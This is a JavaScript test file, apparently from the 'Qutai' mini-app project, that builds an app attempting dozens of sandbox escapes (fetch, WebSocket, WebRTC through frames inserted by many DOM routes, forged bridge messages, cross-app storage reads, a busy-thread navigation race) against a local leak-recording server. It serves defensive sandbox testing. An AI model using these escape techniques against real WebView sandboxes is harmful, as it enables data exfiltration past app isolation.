// A test app that tries to break out of the app sandbox (docs/mini-apps.md › The runtime): the network in every way
// a page can reach it, navigation, windows, frames, the parent, cookies and web storage, eval, other apps' data and
// Qutai's calls, oversized writes and the quota, undeclared and later-phase permissions. Each attempt is shown on the
// page as PASS (blocked) or FAIL (got through), and the summary goes to the console, which the preview returns.
//
// Network attempts all go to http://127.0.0.1:<port>/leak/<kind> — the fake AI server (scripts/fake-ai/server.mjs)
// records any such request at GET /leaks, so a request that left the WebView is caught even when the page can't
// tell. After a run: curl http://127.0.0.1:8793/leaks must print [].

export function breakoutFiles(port = 8793) {
  const base = `http://127.0.0.1:${port}/leak`;
  return {
    'index.html': `<!doctype html>
<html><head><title>Break-out test</title><link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="${base}/link-stylesheet">
<script src="${base}/script-src"></script>
<link rel="prefetch" href="${base}/prefetch">
</head>
<body>
<h1>Break-out test</h1>
<p id="summary" role="status" aria-live="polite">Running…</p>
<ul id="results"></ul>
<div class="bg"></div>
<form id="f" action="${base}/form" method="post"><input name="x" value="secret"></form>
<a id="link" href="${base}/link">link</a>
<iframe id="static-frame" onload="window.__staticFrame = (window[0] && window[0].RTCPeerConnection) ? 'reachable' : 'no'"></iframe>
<script src="app.js"></script>
</body></html>`,
    'style.css': `body { padding: 1rem; } li.pass { color: var(--qutai-text); } li.fail { color: var(--qutai-danger); font-weight: 700; }
.bg { width: 10px; height: 10px; background: url("${base}/css-url"); }
@font-face { font-family: Leak; src: url("${base}/font"); } h1 { font-family: Leak, system-ui; }`,
    'app.js': `const BASE = ${JSON.stringify(base)};
const results = [];
function record(name, pass, detail) {
  results.push({ name, pass });
  const li = document.createElement('li');
  li.className = pass ? 'pass' : 'fail';
  li.textContent = (pass ? 'PASS ' : 'FAIL ') + name + (detail ? ' — ' + detail : '');
  document.getElementById('results').append(li);
  if (!pass) console.error('BREAKOUT FAIL: ' + name + (detail ? ' — ' + detail : ''));
}
async function attempt(name, fn) {
  try {
    const r = await fn();
    record(name, r === true, r === true ? '' : 'got through: ' + String(r).slice(0, 80));
  } catch (e) {
    record(name, true, (e && (e.code || e.name)) || 'blocked');
  }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function run() {
  // Network: every call must fail; requests that slip past are caught by the server's /leaks list.
  await attempt('fetch', async () => { await fetch(BASE + '/fetch'); return 'fetch resolved'; });
  await attempt('fetch with no-cors', async () => { await window.fetch(BASE + '/fetch-nocors', { mode: 'no-cors' }); return 'resolved'; });
  await attempt('XMLHttpRequest', () => { const x = new XMLHttpRequest(); x.open('GET', BASE + '/xhr'); x.send(); return 'sent'; });
  await attempt('WebSocket', () => { new WebSocket(BASE.replace('http', 'ws') + '/ws'); return 'opened'; });
  await attempt('EventSource', () => { new EventSource(BASE + '/sse'); return 'opened'; });
  await attempt('sendBeacon', () => navigator.sendBeacon(BASE + '/beacon', 'secret') === false || 'sent');
  await attempt('RTCPeerConnection', () => { new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${port}' }] }); return 'made'; });
  await attempt('Worker', () => { new Worker(BASE + '/worker.js'); return 'made'; });
  await attempt('image load', () => new Promise((resolve) => {
    const img = new Image();
    img.onload = () => resolve('loaded');
    img.onerror = () => resolve(true);
    img.src = BASE + '/img';
    setTimeout(() => resolve(true), 3000);
  }));
  await attempt('service worker', () => (navigator.serviceWorker ? navigator.serviceWorker.register(BASE + '/sw.js').then(() => 'registered') : true));
  await attempt('WebAssembly', async () => {
    await WebAssembly.instantiate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]));
    return 'compiled';
  });

  // Code from strings.
  await attempt('eval', () => { eval('1 + 1'); return 'ran'; });
  await attempt('new Function', () => { new Function('return 1')(); return 'ran'; });
  await attempt('setTimeout with a string', () => new Promise((resolve) => {
    window.__leak = false;
    try { setTimeout('window.__leak = true', 0); } catch (e) { return resolve(true); }
    setTimeout(() => resolve(window.__leak ? 'ran' : true), 200);
  }));

  // Frames, windows, the parent.
  await attempt('window.open', () => window.open(BASE + '/open') === null || 'opened');
  await attempt('iframe', async () => {
    const f = document.createElement('iframe');
    f.src = BASE + '/iframe';
    document.body.append(f);
    const reach = f.contentWindow;
    await sleep(50);
    return (reach === null && !document.contains(f)) || 'frame stayed or reachable';
  });
  await attempt('about:blank iframe for fresh APIs', async () => {
    const f = document.createElement('iframe');
    document.body.append(f);
    const w = f.contentWindow;
    return (!w || !w.RTCPeerConnection) || 'fresh RTCPeerConnection reachable';
  });
  // The frame's window through window[0] can't be intercepted by the lockdown: only a script that runs in every frame
  // (phase 2's frame guard) takes WebRTC away there.
  await attempt('window[0] of an about:blank frame has no WebRTC', () => {
    const f = document.createElement('iframe');
    document.body.append(f);
    const w = window[0] || window.frames[0];
    const R = w && (w.RTCPeerConnection || w.webkitRTCPeerConnection);
    if (!R) return true;
    try {
      const pc = new R({ iceServers: [{ urls: 'stun:127.0.0.1:${port}' }] });
      pc.createDataChannel('leak');
      pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
    } catch (e) {}
    return 'fresh RTCPeerConnection from window[0]';
  });
  // Every other way of getting a frame (and its window[0]) into the document (phase 2, closed 19 Nov 2026 by the
  // insertion guard): each must leave no frame and no reachable RTCPeerConnection, checked synchronously.
  const FRAMES = 'iframe,frame,object,embed,portal,fencedframe';
  const frameRoutes = {
    'markup in index.html': () => {},
    'innerHTML with onload': () => { const d = document.createElement('div'); document.body.append(d); d.innerHTML = '<iframe onload="window.__fr = this"></iframe>'; },
    'outerHTML': () => { const d = document.createElement('div'); document.body.append(d); d.outerHTML = '<iframe></iframe>'; },
    'insertAdjacentHTML': () => document.body.insertAdjacentHTML('beforeend', '<IFRAME/>'),
    'a string that changes on each read': () => { let n = 0; const d = document.createElement('div'); document.body.append(d); d.innerHTML = { toString: () => (n++ ? '<iframe></iframe>' : '<b></b>') }; },
    'shadow root innerHTML': () => { const h = document.createElement('div'); document.body.append(h); h.attachShadow({ mode: 'closed' }).innerHTML = '<iframe></iframe>'; },
    'shadow root appendChild': () => { const h = document.createElement('div'); document.body.append(h); h.attachShadow({ mode: 'open' }).appendChild(document.createElement('iframe')); },
    'a detached closed shadow root moved in': () => { const h = document.createElement('div'); h.attachShadow({ mode: 'closed' }).append(document.createElement('iframe')); document.body.append(h); },
    'DOMParser and adoptNode': () => { const doc = new DOMParser().parseFromString('<div><iframe></iframe></div>', 'text/html'); document.body.appendChild(document.adoptNode(doc.body.firstChild)); },
    'XHTML DOMParser': () => { const doc = new DOMParser().parseFromString('<x xmlns="http://www.w3.org/1999/xhtml"><iframe/></x>', 'application/xhtml+xml'); document.body.append(document.importNode(doc.documentElement, true)); },
    'template content': () => { const t = document.createElement('template'); t.innerHTML = '<iframe></iframe>'; document.body.append(t.content.cloneNode(true)); },
    'createHTMLDocument': () => { const doc = document.implementation.createHTMLDocument(''); const f = doc.createElement('iframe'); doc.body.append(f); document.body.append(document.adoptNode(doc.body)); },
    'document.write': () => document.write('<iframe></iframe>'),
    'document.open': () => document.open(),
    'execCommand insertHTML': () => { const e = document.createElement('div'); e.contentEditable = 'true'; document.body.append(e); e.focus(); document.execCommand('insertHTML', false, '<iframe></iframe>'); },
    'Range.insertNode': () => { const r = document.createRange(); r.selectNodeContents(document.body); r.insertNode(document.createElement('iframe')); },
    'Range.surroundContents': () => { const p = document.createElement('p'); p.textContent = 'x'; document.body.append(p); const r = document.createRange(); r.selectNodeContents(p); r.surroundContents(document.createElement('iframe')); },
    'createContextualFragment': () => { const r = document.createRange(); r.selectNode(document.body); document.body.append(r.createContextualFragment('<iframe></iframe>')); },
    'text node after()': () => { const t = document.createTextNode('x'); document.body.append(t); t.after(document.createElement('iframe')); },
    'replaceChildren': () => { const d = document.createElement('div'); document.body.append(d); d.replaceChildren(document.createElement('iframe')); },
    'insertAdjacentElement': () => document.body.insertAdjacentElement('beforeend', document.createElement('iframe')),
    'object element': () => document.body.append(Object.assign(document.createElement('object'), { data: 'about:blank' })),
    'embed element': () => document.body.append(document.createElement('embed')),
    'setHTMLUnsafe with a declarative shadow root': () => { const d = document.createElement('div'); document.body.append(d); d.setHTMLUnsafe('<div><template shadowrootmode="closed"><iframe></iframe></template></div>'); },
    'Node.prototype.appendChild via call': () => Node.prototype.appendChild.call(document.body, document.createElement('iframe')),
  };
  for (const [name, route] of Object.entries(frameRoutes)) {
    await attempt('no frame window via ' + name, () => {
      try { route(); } catch (e) {}
      const w = window[0] || window.frames[0];
      const R = w && (w.RTCPeerConnection || w.webkitRTCPeerConnection);
      const count = window.length;
      document.querySelectorAll(FRAMES).forEach((f) => f.remove());
      if (window.__staticFrame === 'reachable') return 'the static frame reached WebRTC';
      return (!R && count === 0) || (R ? 'fresh RTCPeerConnection from window[0]' : count + ' frame window(s)');
    });
  }
  await attempt('parent and top are this window', () => (window.parent === window && window.top === window && !window.opener) || 'has a parent');

  // Site data.
  await attempt('document.cookie', () => { document.cookie = 'a=1'; return document.cookie === '' || 'cookie: ' + document.cookie; });
  await attempt('localStorage', () => { localStorage.setItem('a', '1'); return 'stored'; });
  await attempt('sessionStorage', () => { sessionStorage.setItem('a', '1'); return 'stored'; });
  await attempt('indexedDB', () => new Promise((resolve) => {
    try {
      const r = indexedDB.open('leak');
      r.onsuccess = () => resolve('opened');
      r.onerror = () => resolve(true);
    } catch (e) { resolve(true); }
    setTimeout(() => resolve(true), 2000);
  }));
  await attempt('caches', async () => { if (!window.caches) return true; await caches.open('x'); return 'opened'; });
  await attempt("origin is the app's own under .invalid", () => /\.apps\.qutai\.invalid$/.test(location.hostname) || 'origin ' + location.origin);
  await attempt('navigator.clipboard', async () => { if (!navigator.clipboard) return true; await navigator.clipboard.readText(); return 'read'; });
  await attempt('navigator.share', () => !navigator.share || 'available');

  // Qutai's bridge.
  await attempt('replace the bridge receiver', () => {
    const before = window.__qutaiReceive;
    window.__qutaiReceive = () => {};
    return window.__qutaiReceive === before || 'replaced';
  });
  await attempt('replace qutai', () => {
    const before = window.qutai;
    window.qutai = {};
    return window.qutai === before || 'replaced';
  });
  await attempt('unknown call', async () => { await qutai.call('apps.list'); return 'answered'; });
  await attempt('another app by id', async () => {
    const v = await qutai.call('storage.get', { key: 'secret', appId: 'app-aaaaaaaaaaaa', app_id: 'app-aaaaaaaaaaaa' });
    return v === null || 'read ' + JSON.stringify(v);
  });
  await attempt('undeclared clipboard.read', async () => { await qutai.clipboard.read(); return 'read'; });
  await attempt('later phase location', async () => { await qutai.call('location.current'); return 'answered'; });
  await attempt('later phase network.fetch', async () => { await qutai.call('network.fetch', { url: BASE + '/bridge' }); return 'answered'; });
  await attempt('forged message', async () => {
    window.ReactNativeWebView.postMessage('{"qutai":1,"id":"x","call":"storage.set"}');
    window.ReactNativeWebView.postMessage('not json');
    return true;
  });
  await attempt('one value over 256 KB', async () => { await qutai.storage.set('big', 'x'.repeat(300 * 1024)); return 'stored'; });
  await attempt('filling the 5 MB quota', async () => {
    const chunk = 'x'.repeat(250 * 1024);
    try {
      for (let i = 0; i < 30; i++) await qutai.storage.set('fill' + i, chunk);
      return 'stored 7.5 MB';
    } catch (e) {
      return e.code === 'E_QUOTA' || e.code;
    } finally {
      for (const key of await qutai.storage.keys('fill')) await qutai.storage.remove(key);
    }
  });

  // The busy-thread race (phase 2): Android's WebView asked Qutai's JavaScript whether a navigation may start and let
  // it through after 250 ms without an answer. A flood of large bridge messages keeps that thread busy for seconds;
  // the navigation right after must still be refused (natively, by the app sandbox) and nothing may reach /leaks.
  const flood = (n) => {
    const big = 'x'.repeat(480 * 1024);
    for (let i = 0; i < n; i++) window.ReactNativeWebView.postMessage(JSON.stringify({ qutai: 1, id: 'flood' + i, call: 'ui.toast', args: { text: big } }));
  };
  await attempt('busy thread, then location assignment', async () => { flood(120); location.href = BASE + '/race-navigate'; await sleep(1500); return true; });
  await attempt('busy thread, then location.replace', async () => { flood(120); location.replace(BASE + '/race-replace'); await sleep(1500); return true; });
  await attempt('busy thread, then meta refresh', async () => {
    flood(120);
    const m = document.createElement('meta');
    m.httpEquiv = 'refresh';
    m.content = '0;url=' + BASE + '/race-refresh';
    document.head.append(m);
    await sleep(1500);
    return true;
  });
  await attempt('busy thread, then image', () => new Promise((resolve) => {
    flood(120);
    const img = new Image();
    img.onload = () => resolve('loaded');
    img.onerror = () => resolve(true);
    img.src = BASE + '/race-img';
    setTimeout(() => resolve(true), 3000);
  }));

  // Leaving the document (last: a success would unload the page).
  await attempt('form submit', async () => { document.getElementById('f').submit(); await sleep(800); return true; });
  await attempt('link click', async () => { document.getElementById('link').click(); await sleep(800); return true; });
  await attempt('location assignment', async () => { location.href = BASE + '/navigate'; await sleep(1200); return true; });
  await attempt('data: navigation', async () => { location.href = 'data:text/html,<p>left</p>'; await sleep(800); return true; });
  await attempt('meta refresh', async () => {
    const m = document.createElement('meta');
    m.httpEquiv = 'refresh';
    m.content = '0;url=' + BASE + '/refresh';
    document.head.append(m);
    await sleep(1200);
    return true;
  });

  const passed = results.filter((r) => r.pass).length;
  const summary = 'BREAKOUT RESULT: ' + passed + '/' + results.length + ' blocked';
  document.getElementById('summary').textContent = summary;
  console.log(summary);
}
run();
`,
  };
}

/** The apps tool's create input for the break-out app. */
export function breakoutCreateInput(port = 8793) {
  return {
    action: 'create',
    name: 'Break-out test',
    description: 'Tries to leave the app sandbox; every line should say PASS.',
    icon: { name: 'tool', color: '#c62828' },
    language: 'en',
    files: breakoutFiles(port),
  };
}
